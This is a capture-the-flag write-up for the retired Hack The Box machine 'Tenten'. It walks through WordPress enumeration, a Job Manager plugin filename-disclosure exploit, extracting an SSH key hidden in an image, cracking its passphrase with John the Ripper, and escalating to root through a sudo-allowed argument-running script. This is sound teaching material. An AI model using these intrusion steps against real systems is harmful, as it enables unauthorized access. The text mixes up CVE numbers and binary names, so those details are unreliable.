# Tenten

This is the write-up for the box Tenten that got retired at the 16th July 2017.
My IP address was 10.10.14.23 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.10    tenten.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/tenten.nmap 10.10.10.10
```

```markdown
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.7.3
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Job Portal &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

On the web page we see a default WordPress page.
We can run **Wpscan** and **Nikto** to find some information and vulnerabilities against this service.
```markdown
wpscan --url http://10.10.10.10 --enumerate
```

We now know that this is WordPress version 4.7.3 from march 2017 and we get a username calld _takis_.
There is the plugin _Job Manager 0.7.25_ installed that has the vulnerability [CVE-2015-6668](https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/) that we are going to exploit.

By clicking this link we get forwarded to **index.php/jobs**.

![Job Listing Link](tenten_jobs-1.png)

Clicking on the button to apply to the job forwards us to **index.php/jobs/apply/8**.
This number tends to be the name a row ID in the WordPress table.

![Apply Now Link](tenten_jobs-2.png)

By iterating through this number we get different pages for every number.
- 1: Hello world!
- 2: Sample Page
- 3: Auto Draft
- 4: _Empty_
- 5: Jobs Listing
- 6: Job Application
- 7: Register
- 8: Pen Tester
- 9: _Empty_
- 10: Application
- 11: cube
- 12: Application
- 13: HackerAccessGranted
- 14: _Empty_

Every number after 13 is just empty so we probably reached the end.
If we "apply" to the job and upload a file we should find that file by doing this procedure again.

![Uploading a file](tenten_jobs-3.png)

When we browse to the 15th ID we see that there is now a Title called **test** that was our input.
WordPress saves uploaded files in the directory **/wp-content/uploads/current_year/current_month/filename.extension**.

So in my case the file I uploaded is in:
> /wp-content/uploads/2019/11/test.jpg

Now we got Arbitrary File Upload but the application does not allow PHP files.
One interesting title is ID 13 with the name **HackerAccessGranted** whose files we should check.

We will use the Python script from the CVE-2019-6668 and modify the following lines to our needs:
```python
# (...)
for year in range(2017,2019):  
    for i in range(3,13):
        for extension in {'jpg','jpeg','png'}:
# (...)
```

After that we can execute the exploit:
```markdown
python CVE-2019-6668.py
```
```markdown
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  

Enter a vulnerable website: http://10.10.10.10
Enter a file name: HackerAccessGranted
[+] URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
```

This finds a JPG file from the mysterious user that we download to analyze further.

### Analyzing the image file

This is kind of a guessing game but there is data hidden in this file via **Steganography**.
We will use **Steghide** to extract the data from there without putting any password:
```markdown
steghide extract -sf HackerAccessGranted.jpg
```

This extracts a file called **id_rsa** which is a RSA-encrypted private key to use with SSH.

#### Decrypting the key

On the first few lines we can see that this key is encrypted with _AES-128-CBC_:
```markdown
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C
(...)
```

By using [sshng2john](https://github.com/stricture/hashstack-server-plugin-jtr/blob/master/scrapers/sshng2john.py) we bring this to a format that is crackable:
```markdown
python sshng2john.py id_rsa
```

Now using the password cracking tool **JohnTheRipper** to crack this:
```markdown
john id_rsa.encrypted --wordlist=/usr/share/wordlists/rockyou.txt
```

After a while we cracked the password for this key:
> superpassword

## Checking SSH (Port 22)

We change the permissions of the key to _600_ as it should be and can now login with SSH on the box:
```markdown
chmod 600 id_rsa

ssh -i id_rsa takis@10.10.10.10
```

We try it with the user _takis_ because that is the only user we enumerated and we are logged in.

## Privilege Escalation

When we look at the commands that _takis_ can execute as root via sudo, we see the file **/bin/fuckin**.
Analyzing it, it executes arguments:
```markdown
cat /bin/fuckin

# Output
#!/bin/bash
$1 $2 $3 $4
```

So if we run this with `sudo` and give it the argument `bash` we should start a Bourne-Shell as root:
```markdown
sudo /bin/fucking bash
```

It does start a session with root and we can read the flag!
